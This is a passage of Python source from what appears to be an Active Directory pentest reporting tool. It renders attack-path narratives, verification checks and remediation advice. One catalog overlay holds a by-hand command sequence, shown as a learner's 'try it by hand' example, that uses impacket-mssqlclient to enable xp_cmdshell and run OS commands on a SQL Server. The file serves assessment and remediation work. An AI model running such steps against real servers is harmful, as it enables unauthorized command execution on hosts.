            "mapped in — so this access frequently exists without anyone intending a "
            "domain-reachable admin to hold it. The follow-on escalations "
            "(SeImpersonate potato, token theft, TRUSTWORTHY-db abuse) all start from "
            "this foothold. The prerequisite is a sysadmin login on the SQL Server "
            "instance."
        ),
        "manual": (
            "# Confirm sysadmin, then enable and use xp_cmdshell for OS execution:\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
            "#   SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1\n"
            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
            "#   SQL> EXEC xp_cmdshell 'whoami';"
        ),
        "verify_windows": (
            "List the members of the SQL sysadmin server role and the Windows "
            "principals mapped to sysadmin logins:\n"
            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT p.name, p.type_desc "
            "FROM sys.server_role_members r JOIN sys.server_principals p ON "
            "r.member_principal_id = p.principal_id WHERE r.role_principal_id = "
            "SUSER_ID('sysadmin');\"\n"
            "# Confirm xp_cmdshell state:\n"
            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT name, value_in_use "
            "FROM sys.configurations WHERE name = 'xp_cmdshell';\""
        ),
        "verify_linux": (
            "Read-only check of whether the account is a SQL sysadmin (no command "
            "run):\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
            "-command \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');\"\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
        ),
        "remediation": (
            "Audit the SQL sysadmin server role and remove every principal that does not require it — especially application logins, Windows groups, and any BUILTIN\\Administrators mapping: SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p ON r.member_principal_id = p.principal_id WHERE r.role_principal_id = SUSER_ID('sysadmin');.",
            "Keep xp_cmdshell disabled (EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;) so a sysadmin foothold cannot execute OS commands, and grant applications the least database role they need rather than sysadmin.",
            "Run the SQL Server service under a low-privileged gMSA and enforce tier separation on the database host so that even OS execution as the service account does not reach privileged credentials.",
            "Monitor SQL logins to the sysadmin role and Event ID 4688 on the host for xp_cmdshell child processes; alert on sp_addsrvrolemember calls adding a login to sysadmin.",
        ),
    },
    # END Tier-2 didactic overlays.
}


# Apply narrative overlays to the base catalog. We do this here (rather than
# retyping 99 _entry() calls) so the overlay dict stays focused on narratives.
_CATALOG_WITH_NARRATIVES: dict[str, AttackStepCatalogEntry] = {}
for _rel, _entry_obj in ATTACK_STEP_CATALOG.items():
    _overlay = _NARRATIVE_OVERLAYS.get(_rel)
    if _overlay:
        _CATALOG_WITH_NARRATIVES[_rel] = replace(
            _entry_obj,
            narrative_template=_overlay.get("long", _entry_obj.narrative_template),
            short_narrative_template=_overlay.get(
                "short", _entry_obj.short_narrative_template
            ),
            manual_command=_overlay.get("manual", _entry_obj.manual_command),
            verify_windows=_overlay.get("verify_windows", _entry_obj.verify_windows),
            verify_linux=_overlay.get("verify_linux", _entry_obj.verify_linux),
            remediation_steps=tuple(
                _overlay.get("remediation", _entry_obj.remediation_steps)
            ),
        )
    else:
        _CATALOG_WITH_NARRATIVES[_rel] = _entry_obj
ATTACK_STEP_CATALOG = _CATALOG_WITH_NARRATIVES  # type: ignore[assignment]

# Secondary index for punctuation-insensitive relation lookup: a PascalCase
# BloodHound relation ("MssqlLinkedServerLateral") must resolve to its snake_case
# catalog key ("mssql_linked_server_lateral"). ``get_attack_step_entry`` consults
# this after the exact lowercased lookup misses. No key collisions (locked by a
# test that asserts the stripped keys are unique).
_CATALOG_BY_LOOKUP_KEY: dict[str, AttackStepCatalogEntry] = {
    _relation_lookup_key(_key): _val for _key, _val in ATTACK_STEP_CATALOG.items()
}


def _infer_node_type(display: str) -> str:
    """Infer a node type label from a display name. Heuristic, matches renderer logic."""
    if not display:
        return "principal"
    name = display.strip()
    lower = name.lower()
    sam = name.split("@", 1)[0] if "@" in name else name
    if "admin" in lower or "da@" in lower:
        return "privileged account"
    if sam.rstrip().endswith("$"):
        return "computer"
    if "@" not in name and "." in name:
        return "domain"
    # Heuristic for groups: common SAM suffixes
    group_hints = ("admins", "operators", " users", "group")
    if any(h in lower for h in group_hints):
        return "group"
    return "user"


def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
    """Extract placeholder values from a raw attack-path step dict."""
    details = step.get("details") if isinstance(step.get("details"), dict) else {}

    def _get_display(
        primary_keys: tuple[str, ...], fallback_keys: tuple[str, ...]
    ) -> str:
        for k in primary_keys:
            v = details.get(k) if isinstance(details, dict) else None
            if isinstance(v, str) and v.strip():
                return v.strip()
        for k in fallback_keys:
            v = step.get(k)
            if isinstance(v, str) and v.strip():
                return v.strip()
        return ""

    source = _get_display(("from", "source_username", "source"), ("source", "from"))
    target = _get_display(
        ("display_to", "to", "target_username", "target"),
        ("target", "to", "display_to"),
    )
    if not source:
        source = "the source principal"
    if not target:
        target = "the target object"

    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
    # Human-formatted label from the shared vocabulary (lazy import to avoid a
    # circular dep at module load; the module itself is LITE-safe).
    try:
        from adscan_internal.services.attack_relation_labels import (
            format_relation_label,
        )

        relation_label = format_relation_label(str(relation_raw))
    except Exception:
        relation_label = str(relation_raw or "Step")

    # ADCS certificate-template name for the {template} placeholder (ESC1-ESC16
    # narratives + remediation). The step details rarely carry a flat "template"
    # string — the ADCS surface stores the abused template under
    # templates_summary / templates / vulnerable_resources — so resolve via the
    # SSOT extractor first, then fall back to the flat key. Reading only the flat
    # "template" key rendered a blank slot ("on template , ...") in the ESC1 step
    # remediation even though Section 03 prints the name.
    template = ""
    if isinstance(details, dict):
        try:
            from adscan_internal.services.adcs_path_display import (
                extract_adcs_template_names,
            )

            template = ", ".join(extract_adcs_template_names(details))
        except Exception:
            template = ""
        if not template:
            tmpl = details.get("template")
            if isinstance(tmpl, str):
                template = tmpl.strip()

    # MSSQL linked-server identity switch — the mapped remote login the SQL
    # session runs as on the target instance (from the edge notes spread into
    # details). Rendered so the pentester and client see WHO the effective
    # operator is (e.g. a linked-server service account), not the originating
    # user. Degrades to a client-safe generic phrase when the concrete login is
    # not known, so the templates never leak a literal placeholder.
    execution_identity = ""
    if isinstance(details, dict):
        execution_identity = str(
            details.get("execution_identity") or details.get("remote_login") or ""
        ).strip()
    connecting_login = ""
    if isinstance(details, dict):
        connecting_login = str(details.get("connecting_login") or "").strip()

    # Environment infrastructure values for the independent-verification commands.
    # dc_ip and the domain name are NOT secrets — they are the scanned
    # environment's own coordinates — so substituting them turns the verify block
    # into a command the client can paste and run against their DC, instead of
    # one carrying literal <dc_ip>/<domain> tokens they must fill in by hand. The
    # render seams (report, attack-path snapshot, attack-graph edge bake) stamp
    # the real dc_ip (resolved via the resolve_dc_ip SSOT) and domain into the
    # step details before this runs; when a seam has neither (a LITE/runtime
    # context, or a synthetic per-relation edge bake), the fallback keeps the
    # literal angle-bracket token so the command stays valid and copyable.
    #
    # SECURITY: <user> and <pass> are deliberately NOT resolved here. <pass> is
    # the client's credential and must NEVER be written into a command that lands
    # in a PDF or the web CTEM. <user> is ambiguous (attacker vs auditor vs the
    # step's own principal) so it stays a literal placeholder the operator fills
    # in; the step's concrete principal is already exposed through {source}.
    dc_ip = ""
    domain = ""
    if isinstance(details, dict):
        dc_ip = str(details.get("dc_ip") or "").strip()
        domain = str(details.get("domain") or "").strip()

    # xp_cmdshell execution plan — whether OS-command execution is already
    # available on the instance or the attacker must enable it first (and revert
    # it afterward). Carried from the overlay notes into details. Always resolves
    # to a non-empty client-safe clause so the template never leaks a literal
    # placeholder; degrades to a neutral phrase when the state is unknown.
    if isinstance(details, dict) and details.get("xp_cmdshell_already_enabled"):
        xp_cmdshell_plan = (
            "xp_cmdshell is already enabled on the host, so commands run directly"
        )
    elif isinstance(details, dict) and details.get("requires_enable"):
        xp_cmdshell_plan = (
            "the attacker enables xp_cmdshell (and disables it again afterward), "
            "then runs commands"
        )
    else:
        xp_cmdshell_plan = "commands run through the SQL Server service"

    return {
        "source": source,
        "target": target,
        "source_type": _infer_node_type(source),
        "target_type": _infer_node_type(target),
        # Degrade to a neutral phrase so an ADCS step remediation never renders a
        # blank "on template , ..." slot when the name could not be resolved.
        "template": template or "the affected certificate template",
        "relation": relation_label,
        "execution_identity": execution_identity or "the SQL Server service account",
        "connecting_login": connecting_login or "the connecting login",
        "xp_cmdshell_plan": xp_cmdshell_plan,
        # Degrade to the literal angle-bracket token when the seam had no value,
        # so the verify command is still valid and copyable (never "None").
        "dc_ip": dc_ip or "<dc_ip>",
        "domain": domain or "<domain>",
    }


#: Sentence terminators that do NOT end a sentence, so the lead-sentence
#: derivation below does not cut a narrative in the middle of one. These are the
#: abbreviations and identifiers that legitimately carry a period inside AD
#: prose: attribute names (``ms-Mcs-AdmPwd``), object identifiers, hostnames and
#: domains (``MEEREEN.ESSOS.LOCAL``), and the usual Latin abbreviations.
_ABBREVIATIONS_WITH_PERIOD: tuple[str, ...] = (
    "e.g.",
    "i.e.",
    "etc.",
    "vs.",
    "cf.",
    "approx.",
    "Inc.",
    "Ltd.",
    "No.",
)

_SENTENCE_END = re.compile(r"(?<=[.!?])\s+(?=[A-Z(])")


def lead_sentence(text: str) -> str:
    """Return the first sentence of a narrative, or the whole thing if it is one.

    The catalog's technique narratives share a shape by convention: the opening
    sentence states what THIS principal can do to THIS target — the fact that is
    particular to one step — and everything after it explains the mechanism,
    which is identical wherever the technique appears. That shape is what lets a
    report explain a technique once and still show, on every route that uses it,
    which principals it was used between.

    Splitting is conservative: a period inside a hostname, a domain, an AD
    attribute name or a common abbreviation does not end a sentence, and a text
    with no detectable break is returned whole rather than truncated. The worst
    case is therefore a short form that is longer than ideal, never a sentence
    cut in half in a client's report.

    Args:
        text: A rendered narrative.

    Returns:
        The first sentence including its terminator, or ``text`` unchanged.
    """
    stripped = (text or "").strip()
    if not stripped:
        return ""
    for match in _SENTENCE_END.finditer(stripped):
        head = stripped[: match.start()]
        # A period that closes an abbreviation, an initial, or a dotted
        # identifier (``ms-Mcs-AdmPwd``, ``MEEREEN.ESSOS.LOCAL``) is not a
        # sentence break — keep reading.
        if any(head.endswith(abbr) for abbr in _ABBREVIATIONS_WITH_PERIOD):
            continue
        # A single capital before the period is an initial, not a sentence end.
        if re.search(r"(?:^|[\s(])[A-Z]\.$", head):
            continue
        return head
    return stripped


def render_step_narrative(
    step: dict[str, Any],
    *,
    short: bool = False,
) -> str:
    """Render a narrative sentence for a single attack-path step.

    Uses the step's relation to look up a catalog entry. If the entry has a
    ``narrative_template`` (or ``short_narrative_template`` when ``short=True``),
    placeholders are substituted from the step's details.

    ``short=True`` always yields a short form when there is any narrative at all.
    Where the catalog authors one it is used verbatim; otherwise the opening
    sentence of the technique's own long narrative is taken, which by the
    catalog's convention is the sentence naming this step's principals and
    target. Consumers rely on the short form to say "this route, these
    principals" while the mechanism is explained once elsewhere, so a technique
    without an authored one-liner must still compress — returning nothing there
    is what made a report print a full technique essay and a pointer telling the
    reader to go and read that same essay somewhere else.

    Args:
        step: Raw step dict with at least ``action``/``relation`` and optional
            ``details`` dict (from / to / display_to / template / etc.).
        short: If True, return the one-liner form.

    Returns:
        The rendered sentence, or an empty string when no template exists.
        Callers may fall back to legacy :func:`describe_attack_step`.
    """
    if not isinstance(step, dict):
        return ""
    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
    entry = get_attack_step_entry(str(relation_raw))
    if entry is None:
        return ""
    derive_from_long = False
    if short:
        tmpl = entry.short_narrative_template
        if not tmpl:
            tmpl = entry.narrative_template
            derive_from_long = True
    else:
        tmpl = entry.narrative_template
    if not tmpl:
        return ""
    placeholders = _extract_step_placeholders(step)
    try:
        rendered = tmpl.format(**placeholders)
    except (KeyError, IndexError):
        # Missing placeholder — return template with as many substitutions as possible.
        rendered = tmpl
        for k, v in placeholders.items():
            rendered = rendered.replace("{" + k + "}", v)
    # Derive the one-liner only after substitution: a placeholder can itself
    # contain a period (a hostname, an FQDN), so the sentence boundary is only
    # knowable once the real names are in place.
    return lead_sentence(rendered) if derive_from_long else rendered


def render_step_manual_command(step: dict[str, Any]) -> str:
    """Render the by-hand manual command for one attack-path step.

    Returns the catalog entry's ``manual_command`` with the ``{source}`` /
    ``{target}`` / ``{template}`` placeholders substituted from the concrete
    step, so the learner sees the real principal/target names rather than
    template tokens. Runtime-only values ADscan resolves during execution
    (``<dc_ip>``, ``<pass>``, ``<ca_name>``) stay as ``<…>`` tokens for the
    learner to fill in — they are angle-bracket tokens, not ``{}`` placeholders,
    so ``str.format`` leaves them untouched.

    Returns an empty string when the relation is unknown or has no authored
    manual command (the didactic card then omits the "Try it by hand" section).
    Consumed by the interactive didactic mode ONLY — never by the client report.
    """
    if not isinstance(step, dict):
        return ""
    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
    entry = get_attack_step_entry(str(relation_raw))
    if entry is None or not entry.manual_command:
        return ""
    placeholders = _extract_step_placeholders(step)
    tmpl = entry.manual_command
    try:
        return tmpl.format(**placeholders)
    except (KeyError, IndexError):
        rendered = tmpl
        for k, v in placeholders.items():
            rendered = rendered.replace("{" + k + "}", v)
        return rendered


#: What a step out of an already-Tier-0-direct principal tells the client
#: INSTEAD of "remove it". Rendered against the step's own source, so the
#: sysadmin reads the name of the principal that legitimately holds the right
#: and knows where the real fix belongs. Client-facing prose: it lands verbatim
#: in the PDF deliverable and the web attack-path panel.
_STRUCTURAL_HIERARCHY_REMEDIATION: str = (
    "No change is required at this step: {source} is part of the domain's Tier 0 "
    "control plane, so this relationship is how Active Directory is built rather "
    "than a misconfiguration. When this step sits inside a longer chain, the "
    "exposure belongs to the earlier step that lets a lower-privileged principal "
    "take control of {source}. Remediate there."
)


def _step_source_is_tier0_direct(step: dict[str, Any]) -> bool:
    """Return whether this step's SOURCE is already a Tier 0 direct principal.

    Reads the ``source_privilege_tier`` the attack-path SSOT stamps into the
    step's ``details`` (``attack_graph_service.path_to_display_record``), which
    is the only place a graph NODE is available — a renderer downstream sees
    labels, and no label can tell you that a machine account is a domain
    controller.

    When the stamp is absent (a step synthesized from labels alone, or an older
    artifact) the source LABEL is graded through the same axis-1 taxonomy as a
    best-effort fallback, which still recognises the named control-plane
    principals (Domain Admins, Domain Controllers, BUILTIN\\Administrators,
    Enterprise Admins, krbtgt). Fails OPEN — an unresolvable source is treated
    as an ordinary principal, so a real finding never loses its remediation.
    """
    if not isinstance(step, dict):
        return False
    details = step.get("details") if isinstance(step.get("details"), dict) else {}
    stamped = str(
        (details.get("source_privilege_tier") if isinstance(details, dict) else None)
        or step.get("source_privilege_tier")
        or ""
    ).strip()
    try:
        from adscan_internal.services.compromise_class import (  # noqa: PLC0415
            PrivilegeTier,
            is_structural_hierarchy_source,
        )
    except Exception:  # noqa: BLE001 — never break rendering over a taxonomy import
        return False
    if stamped:
        return stamped == PrivilegeTier.TIER0_DIRECT.value
    source_label = _extract_step_placeholders(step).get("source") or ""
    if not source_label or source_label == "the source principal":
        return False
    return is_structural_hierarchy_source({"name": source_label})


def render_step_remediation(step: dict[str, Any]) -> list[str]:
    """Render structured remediation steps for one attack-path step.

    Prefers the edge-specific, templated ``remediation_steps`` on the catalog
    entry (rendered against the step's source/target). When an entry has none —
    e.g. the ADCS ESC1-16 entries, which intentionally keep their remediation
    only in ``VULN_CATALOG`` (the technique-prose SSOT), not as per-edge steps —
    it falls back to the canonical static ``remediation`` from ``VULN_CATALOG``
    via the entry's ``vuln_key`` join, so NO vulnerability step in the report
    ever renders without remediation.

    The per-edge templates are the ones that interpolate ``{source}`` and say
    "remove it", so they are the ones a Tier-0-direct source must not receive.
    Every right such a principal holds and every group it belongs to is built-in
    AD hierarchy — Domain Controllers holds the replication extended rights
    because that IS replication, Domain Admins sits inside
    BUILTIN\\Administrators because Windows puts it there at the first DC
    promotion, and a DC computer account belongs to Domain Controllers because
    that is what makes it a DC. Rendering "Remove {source} from {target}" over
    those told the client to break their own directory. For such a step the
    per-edge templates are skipped in favour of a line that says the
    relationship is by design and points at the earlier step where the exposure
    actually lives, followed by the technique-level ``VULN_CATALOG``
    remediation, which never names the source and stays correct (DCSync's, for
    instance, is "restrict replication rights to Domain Controllers and
    authorised sync accounts" — the right advice, and the opposite of what the
    per-edge template said). A step that had no remediation to begin with gains
    none. The step keeps its narrative and stays visible in the chain, because
    that is how the chain works; only the advice changes. Same rule
    ``severity.compute_edge_severity`` applies as Rule 1 and CLAUDE.md
    § Nomenclature Standard states as hard rule 3.

    This function is the single source of truth for step remediation on every
    surface: the PDF deliverable calls it at render time, and the web reads the
    ``knowledge`` blocks that ``build_step_knowledge`` — which calls it — bakes
    into ``attack_paths_snapshot.json`` and ``attack_graph.json``.
    """
    if not isinstance(step, dict):
        return []
    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
    entry = get_attack_step_entry(str(relation_raw))
    if entry is None:
        return []

    def _clean_bullet(value: Any) -> str:
        # VULN_CATALOG remediation lines carry a literal "[bullet] " marker; the
        # step renderer emits its own bullet, so strip the marker for parity
        # with the edge-specific remediation_steps.
        text = str(value).strip()
        if text.lower().startswith("[bullet]"):
            text = text[len("[bullet]"):].strip()
        return text

    def _technique_remediation() -> list[str]:
        """Return the canonical static remediation from ``VULN_CATALOG``.

        Technique-level advice, joined by the entry's ``vuln_key`` — it never
        names the step's source, so it stays correct for a Tier-0-direct source
        as well as for an ordinary one.
        """
        prose = resolve_technique_prose(getattr(entry, "vuln_key", None))
        remediation = prose.get("remediation")
        if isinstance(remediation, (list, tuple)):
            return [cleaned for item in remediation if (cleaned := _clean_bullet(item))]
        if isinstance(remediation, str) and _clean_bullet(remediation):
            return [_clean_bullet(remediation)]
        return []

    if _step_source_is_tier0_direct(step):
        technique = _technique_remediation()
        if not entry.remediation_steps and not technique:
            # Nothing was ever rendered for this step — do not invent an
            # explanation for advice that never existed.
            return []
        placeholders = _extract_step_placeholders(step)
        return [
            _STRUCTURAL_HIERARCHY_REMEDIATION.format(
                source=placeholders.get("source") or "this principal"
            ),
            *technique,
        ]

    if entry.remediation_steps:
        placeholders = _extract_step_placeholders(step)
        rendered: list[str] = []
        for item in entry.remediation_steps:
            try:
                rendered.append(item.format(**placeholders))
            except (KeyError, IndexError):
                out = item
                for k, v in placeholders.items():
                    out = out.replace("{" + k + "}", v)
                rendered.append(out)
        return rendered
    # Fallback: pull the canonical static remediation from VULN_CATALOG via the
    # vuln_key join (ADCS ESC* and any vuln-bearing edge without per-edge steps).
    return _technique_remediation()


def _render_verify_template(tmpl: str, placeholders: dict[str, str]) -> str:
    """Substitute step placeholders into a verification command template.

    Uses literal ``{token}`` replacement rather than ``str.format`` because
    verification commands legitimately contain shell/PowerShell brace blocks
    (``Where-Object { ... }``) that ``str.format`` would misparse.
    """
    if not tmpl:
        return ""
    rendered = tmpl
    for key, value in placeholders.items():
        rendered = rendered.replace("{" + key + "}", value)
    return rendered


def render_step_verify(step: dict[str, Any]) -> dict[str, str]:
    """Render the independent-verification commands for one attack-path step.

    Returns ``{"windows": <native MS command>, "linux": <tool/reference>}`` with
    the ``{source}``/``{target}``/``{template}`` placeholders substituted from the
    concrete step. Either value is an empty string when not authored. This is the
    ONE client-facing block permitted to name standard verification tools
    (nxc/certipy/impacket/bloodyAD) — never competitors — so the client can
    reproduce the finding by hand and rule out a false positive.
    """
    if not isinstance(step, dict):
        return {"windows": "", "linux": ""}
    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
    entry = get_attack_step_entry(str(relation_raw))
    if entry is None:
        return {"windows": "", "linux": ""}
    placeholders = _extract_step_placeholders(step)
    return {
        "windows": _render_verify_template(entry.verify_windows, placeholders),
        "linux": _render_verify_template(entry.verify_linux, placeholders),
    }


def resolve_technique_prose(vuln_key: str | None) -> dict[str, Any]:
    """Resolve canonical technique prose for a step from ``VULN_CATALOG``.

    ``VULN_CATALOG`` is the single source of truth for *technique* prose —
    the long-form description, impact, static remediation, structured
    remediation_options, and references. An attack-step entry joins to it via
    its ``vuln_key``; this function performs that join so the per-step
    ``knowledge`` object carries the same canonical prose the finding-level
    report uses, instead of re-authoring it on the attack-step side.

    The import is lazy + best-effort: ``VULN_CATALOG`` lives in the PRO
    reporting tree and may be absent in a LITE/runtime-only context, so a
    missing module yields an empty dict and the caller falls back to the
    edge-summary already present on the catalog entry.

    Args:
        vuln_key: The catalog join key (``AttackStepCatalogEntry.vuln_key``),
            or ``None`` for an edge that does not represent a vulnerability.

    Returns:
        A dict with whichever of ``description``, ``impact``, ``remediation``,
        ``remediation_options``, ``references`` ``VULN_CATALOG`` carries for
        the key. Empty when no key, no entry, or the catalog is unavailable.
    """
    if not vuln_key:
        return {}
    try:
        from adscan_internal.pro.reporting.vuln_catalog import VULN_CATALOG
    except Exception:
        return {}
    entry = VULN_CATALOG.get(vuln_key)
    if not isinstance(entry, dict):
        return {}
    prose: dict[str, Any] = {}
    for field_name in (
        "description",
        "impact",
        "remediation",
        "remediation_options",
        "references",
    ):
        value = entry.get(field_name)
        if value:
            prose[field_name] = value
    return prose


def build_step_knowledge(step: dict[str, Any]) -> dict[str, Any] | None:
    """Build the rich ``knowledge`` sub-object for one attack-path step.

    Resolves the step's relation to its catalog entry and bundles the
    human-facing knowledge so it travels into ``attack_paths_snapshot.json``
    for the web (Phase 2) and report (Phase 3). The narrative and remediation
    steps are RENDERED against the step's own details (source/target/template)
    so they are concrete, not templated.

    Technique prose (the long-form ``description``, ``impact``, static
    ``remediation``, structured ``remediation_options``, ``references``) is
    pulled from ``VULN_CATALOG`` via the ``vuln_key`` join — that catalog is
    the single source of truth for technique prose, so it is not duplicated on
    the attack-step side. Only the genuinely edge-specific bits are authored
    here: the rendered ``narrative``, the rendered (templated) per-edge
    ``remediation_steps``, the MITRE technique mapping, the concise
    ``step_summary`` edge label, and the ``vuln_key`` join itself.

    When no ``vuln_key`` resolves (an edge with no matching finding, or a
    LITE context without the PRO catalog), the canonical ``description`` falls
    back to the edge summary so the shape never loses its description.

    The emitted shape (self-describing — Phase 2/3 depend on it):
        {
            "description": str,                 # canonical technique prose (VULN_CATALOG)
            "impact": str,                      # from VULN_CATALOG (omitted if absent)
            "remediation": list[str],           # static, from VULN_CATALOG (omitted if absent)
            "remediation_options": list[dict],  # structured, from VULN_CATALOG (omitted if absent)
            "references": list[str],            # from VULN_CATALOG (omitted if absent)
            "step_summary": str,                # concise edge-specific summary label
            "remediation_steps": list[str],     # rendered, ordered, edge-specific
            "narrative": str,                   # rendered long-form sentence
            "verify_windows": str,              # native MS check (omitted if absent)
            "verify_linux": str,                # tool/reference check (omitted if absent)
            "mitre_technique_id": str | None,
            "mitre_technique_name": str | None,
            "vuln_key": str | None,             # the unification join to a finding
        }

    Args:
        step: Raw attack-path step dict with at least ``action``/``relation``
            and an optional ``details`` dict.

    Returns:
        The knowledge dict, or ``None`` when the relation has no catalog entry.
    """
    if not isinstance(step, dict):
        return None
    relation_raw = (
        step.get("action") or step.get("relation") or step.get("type") or ""
    )
    entry = get_attack_step_entry(str(relation_raw))
    if entry is None:
        return None
    narrative = render_step_narrative(step) or (entry.narrative_template or "")
    edge_summary = entry.description or ""
    prose = resolve_technique_prose(entry.vuln_key)
    knowledge: dict[str, Any] = {
        # Canonical technique prose from VULN_CATALOG; falls back to the edge
        # summary when no vuln_key resolves so the field is never empty.
        "description": prose.get("description") or edge_summary,
        "step_summary": edge_summary,
        "remediation_steps": render_step_remediation(step),
        "narrative": narrative,
        "mitre_technique_id": entry.mitre_technique_id,
        "mitre_technique_name": entry.mitre_technique_name,
        "vuln_key": entry.vuln_key,
    }
    # Independent-verification block (client reproduces the finding by hand).
    # Rendered against the step; omitted when not authored so the shape is clean.
    _verify = render_step_verify(step)
    if _verify.get("windows"):
        knowledge["verify_windows"] = _verify["windows"]
    if _verify.get("linux"):
        knowledge["verify_linux"] = _verify["linux"]
    # Surface the remaining canonical prose fields when VULN_CATALOG carries
    # them — absent fields are omitted so the shape stays clean.
    for field_name in ("impact", "remediation", "remediation_options", "references"):
        value = prose.get(field_name)
        if value:
            knowledge[field_name] = value
    return knowledge


_STATUS_PHRASE: dict[str, str] = {
    "exploited": "was successfully exploited during active testing",
    "attempted": "was probed but not fully executed in the engagement window",
    # A "blocked" path is one ADscan withheld from live execution for safety (a
    # destructive/disruptive technique). Never phrased as "a control stopped it" —
    # ADscan validates exposure, not defensive tooling.
    "blocked": "was withheld from live execution as a safety precaution",
    "closed_by_configuration": (
        "targets an avenue your environment's configuration already closes"
    ),
    # A validated SEGMENT. Never folded into "probed but not fully executed":
    # a step of this chain ran successfully against the live environment, which
    # is materially stronger evidence than an attempt that went nowhere.
    "partial": (
        "had part of its chain validated by live execution, but was not run "
        "end-to-end"
    ),
    # No reachable surface to test the avenue, so its exposure is unknown
    # rather than mapped. Deliberately NOT "a viable route": that claimed more
    # than the engagement observed, and it contradicted the card's own badge.
    "unsupported": (
        "was not assessed in this engagement: no reachable surface was "
        "available to test the avenue"
    ),
    "theoretical": "is a theoretical route derived from configuration analysis",
}


def render_path_summary(path: dict[str, Any]) -> str:
    """Render a 2-3 sentence executive narrative for a full attack path.

    Pulls source / target / steps from the path dict and synthesizes a
    BloodHound-style one-paragraph narrative suitable for report headers or
    web detail views. Works with any step sequence — no hardcoded relations.
    """
    if not isinstance(path, dict):
        return ""

    nodes = path.get("nodes") or []
    steps = path.get("steps") or []
    status_raw = str(path.get("status") or "theoretical").strip().lower()
    if status_raw in {"success", "succeeded"}:
        status_raw = "exploited"
    elif status_raw in {"failed", "error"}:
        status_raw = "attempted"
    elif status_raw == "unavailable":
        status_raw = "unsupported"

    # Resolve display names for the endpoints
    source = str(path.get("source") or "").strip()
    target = str(path.get("target") or "").strip()
    if not source and steps:
        first = steps[0] if isinstance(steps[0], dict) else {}
        details = first.get("details") if isinstance(first, dict) else {}
        if isinstance(details, dict):
            source = str(details.get("from") or "").strip()
    if not target and steps:
        last = steps[-1] if isinstance(steps[-1], dict) else {}
        details = last.get("details") if isinstance(last, dict) else {}
        if isinstance(details, dict):
            target = str(details.get("display_to") or details.get("to") or "").strip()
    source_is_placeholder = not source
    target_is_placeholder = not target
    if source_is_placeholder:
        source = "an unprivileged foothold"
    if target_is_placeholder:
        target = "the target principal"

    # Collect unique technique labels in path order
    try:
        from adscan_internal.services.attack_relation_labels import (
            format_relation_label,
        )

        label_fn = format_relation_label
    except Exception:

        def label_fn(s: str) -> str:  # type: ignore[misc]
            return str(s)

    seen: set[str] = set()
    techniques: list[str] = []
    for step in steps:
        if not isinstance(step, dict):
            continue
        rel = step.get("action") or step.get("relation") or step.get("type")
        if not rel:
            continue
        lbl = label_fn(str(rel))
        if lbl.lower() in seen:
            continue
        seen.add(lbl.lower())
        techniques.append(lbl)

    step_count = len([s for s in steps if isinstance(s, (dict, str))])
    step_word = "step" if step_count == 1 else "steps"
    status_phrase = _STATUS_PHRASE.get(status_raw, _STATUS_PHRASE["theoretical"])

    source_phrase = source if source_is_placeholder else source
    target_phrase = target if target_is_placeholder else target

    parts: list[str] = []
    if len(nodes) >= 2:
        parts.append(
            f"Starting from {source_phrase}, an attacker can reach "
            f"{target_phrase} in {step_count} {step_word}."
        )
    else:
        parts.append(f"This path targets {target_phrase}.")

    if techniques:
        if len(techniques) == 1:
            parts.append(f"The path abuses {techniques[0]}.")
        elif len(techniques) == 2:
            parts.append(f"The path chains {techniques[0]} and {techniques[1]}.")
        else:
            head = ", ".join(techniques[:-1])
            parts.append(f"The path chains {head}, and {techniques[-1]}.")

    parts.append(f"This attack path {status_phrase}.")
    return " ".join(parts)
